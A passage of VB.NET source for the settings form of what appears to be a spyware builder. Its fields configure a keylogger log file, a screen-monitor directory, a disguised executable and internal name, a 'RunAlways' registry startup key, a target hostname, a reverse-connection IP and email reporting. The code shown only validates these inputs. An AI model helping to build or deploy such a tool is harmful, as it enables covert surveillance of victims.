            If (Not (CType(sender, TextBox).Text.Equals(IDS_NULL_STRING))) Then SendKeys.Send("{END}")
        Else
            m_boolTextChanged(m_intCurrentTextBox) = True
            If (Not (CType(sender, TextBox).Text.Trim().Equals(IDS_NULL_STRING))) Then CType(sender, TextBox).Tag = CType(sender, TextBox).Text
        End If
    End Sub

    Public Sub txtLogFileName_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtLogFileName.Validated
        Dim boolValid As Boolean = False
        Dim strErrorMsg As String = IDS_FILEORPATH_INVALID

        Select Case m_intCurrentTextBox
            Case TEXT_IDS.ID_KEYLOGGER_FILENAME
                boolValid = m_objStringUtility.ValidPathAndFileName(CType(sender, TextBox).Text, False)
            Case TEXT_IDS.ID_EXE_FILE_NAME
                boolValid = m_objStringUtility.ValidPathAndFileName(CType(sender, TextBox).Text, False)
            Case TEXT_IDS.ID_SCREENMONITOR_DIRNAME
                boolValid = m_objStringUtility.ValidPathAndFileName(CType(sender, TextBox).Text, True)
            Case TEXT_IDS.ID_EXE_SETUP_SAVEDIR
                boolValid = System.IO.Directory.Exists(CType(sender, TextBox).Text)
            Case TEXT_IDS.ID_IP
                boolValid = m_objStringUtility.ValidIP(CType(sender, TextBox).Text)
                strErrorMsg = IDS_IPADDRESS_INVALID
            Case TEXT_IDS.ID_DOMAIN
                boolValid = m_objStringUtility.IsValidIdentifier(CType(sender, TextBox).Text)
                strErrorMsg = IDS_DOMAIN_INVALID
            Case TEXT_IDS.ID_EMAIL
                boolValid = m_objStringUtility.IsValidIdentifier(CType(sender, TextBox).Text)
                strErrorMsg = IDS_EMAIL_INVALID
            Case TEXT_IDS.ID_EMAIL_SERVER
                boolValid = m_objStringUtility.IsValidIdentifier(CType(sender, TextBox).Text)
                strErrorMsg = IDS_EMAIL_SERVER_INVALID
            Case TEXT_IDS.ID_EXE_TARGET_HOSTNAME
                boolValid = m_objStringUtility.IsValidIdentifier(CType(sender, TextBox).Text)
                strErrorMsg = IDS_EXE_TARGET_HOSTNAME_INVALID
            Case TEXT_IDS.ID_EXE_REGISTRYNAME
                boolValid = m_objStringUtility.IsValidIdentifier(CType(sender, TextBox).Text)
                strErrorMsg = IDS_EXE_REGISTRYNAME_INVALID
            Case TEXT_IDS.ID_EXE_INTERNAL_NAME
                boolValid = m_objStringUtility.IsValidIdentifier(CType(sender, TextBox).Text)
                strErrorMsg = IDS_EXE_INTERNALNAME_INVALID
        End Select

        If (Not boolValid) Then
            CType(sender, TextBox).Tag = CType(sender, TextBox).Text
            If (m_boolTextChanged(m_intCurrentTextBox) = True) Then MessageBox.Show(strErrorMsg, Me.Text(), MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1)
            m_boolTextChanged(m_intCurrentTextBox) = False
        End If
    End Sub

    Private Sub txtScreenMonitorDirName_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtScreenMonitorDirName.KeyUp
        m_intCurrentTextBox = TEXT_IDS.ID_SCREENMONITOR_DIRNAME
        Call txtLogFileName_KeyUp(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtScreenMonitorDirName_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtScreenMonitorDirName.Validated
        m_intCurrentTextBox = TEXT_IDS.ID_SCREENMONITOR_DIRNAME
        txtLogFileName_Validated(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtWinMonitorSaveDir_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtWinMonitorSaveDir.Validated
        m_intCurrentTextBox = TEXT_IDS.ID_EXE_SETUP_SAVEDIR
        txtLogFileName_Validated(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtWinMonitorSaveDir_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtWinMonitorSaveDir.KeyUp
        m_intCurrentTextBox = TEXT_IDS.ID_EXE_SETUP_SAVEDIR
        Call txtLogFileName_KeyUp(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtNwMonitorReverseConnectionIP_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtNwMonitorReverseConnectionIP.KeyUp
        m_intCurrentTextBox = TEXT_IDS.ID_DOMAIN
        Call txtLogFileName_KeyUp(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtNwMonitorReverseConnectionIP_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtNwMonitorReverseConnectionIP.Validated
        m_intCurrentTextBox = TEXT_IDS.ID_DOMAIN
        txtLogFileName_Validated(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtNwMonitorRePassword_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtNwMonitorRePassword.Validated
        If (CType(sender, TextBox).Text.Equals(CType(CType(sender, TextBox).Tag, String))) Then Return
        CType(sender, TextBox).Tag = CType(sender, TextBox).Text
        If (CType(sender, TextBox).Text.Equals(txtNwMonitorPassword.Text)) Then Return
        Call MessageBox.Show(IDS_PASSWORDS_CONFLICTED, Me.Text, MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1)
    End Sub

    Private Sub txtNwMonitorRePassword_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtNwMonitorRePassword.KeyUp
        CType(sender, TextBox).Tag = CType(sender, TextBox).Text + IDS_DOT
    End Sub

    Private Sub txtNwMonitorPassword_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtNwMonitorPassword.KeyUp
        txtNwMonitorRePassword.Tag = txtNwMonitorRePassword.Text + IDS_DOT
    End Sub

    Private Sub txtWinMonitorInternalName_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtWinMonitorInternalName.Validated
        m_intCurrentTextBox = TEXT_IDS.ID_EXE_INTERNAL_NAME
        txtLogFileName_Validated(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtWinMonitorInternalName_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtWinMonitorInternalName.KeyUp
        m_intCurrentTextBox = TEXT_IDS.ID_EXE_INTERNAL_NAME
        txtLogFileName_KeyUp(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtWinMonitorRegKeyName_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtWinMonitorRegKeyName.Validated
        m_intCurrentTextBox = TEXT_IDS.ID_EXE_REGISTRYNAME
        txtLogFileName_Validated(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtWinMonitorRegKeyName_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtWinMonitorRegKeyName.KeyUp
        m_intCurrentTextBox = TEXT_IDS.ID_EXE_REGISTRYNAME
        txtLogFileName_KeyUp(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtNwMonitorEmail_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtNwMonitorEmail.KeyUp
        m_intCurrentTextBox = TEXT_IDS.ID_EMAIL
        txtLogFileName_KeyUp(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtNwMonitorEmail_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtNwMonitorEmail.Validated
        m_intCurrentTextBox = TEXT_IDS.ID_EMAIL
        txtLogFileName_Validated(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtNwMonitorEmailServer_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtNwMonitorEmailServer.KeyUp
        m_intCurrentTextBox = TEXT_IDS.ID_EMAIL_SERVER
        txtLogFileName_KeyUp(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtNwMonitorEmailServer_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtNwMonitorEmailServer.Validated
        m_intCurrentTextBox = TEXT_IDS.ID_EMAIL_SERVER
        txtLogFileName_Validated(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtWinMonitorTargetedHostName_Validated(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtWinMonitorTargetedHostName.Validated
        m_intCurrentTextBox = TEXT_IDS.ID_EXE_TARGET_HOSTNAME
        txtLogFileName_Validated(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

    Private Sub txtWinMonitorTargetedHostName_KeyUp(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles txtWinMonitorTargetedHostName.KeyUp
        m_intCurrentTextBox = TEXT_IDS.ID_EXE_TARGET_HOSTNAME
        txtLogFileName_KeyUp(sender, e)
        m_intCurrentTextBox = TEXT_IDS.ID_KEYLOGGER_FILENAME
    End Sub

#End Region

#End Region


    Private Sub btnWinMonitorSaveDir_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnWinMonitorSaveDir.Click
        Dim strSaveDir As String
        If (m_objStringUtility.BrowseFolder(IDS_NULL_STRING, strSaveDir, Me.Handle)) Then
            txtWinMonitorSaveDir.Text = strSaveDir.Trim()
        Else
            txtWinMonitorSaveDir.Text = IDS_NULL_STRING
        End If
    End Sub

    Private Sub rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways_DoubleClick(ByVal sender As System.Object, ByVal e As System.EventArgs)
        rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways.Checked = Not rdobtnWinMonitorHKEY_LOCAL_USER_RunAlways.Checked
    End Sub

End Class
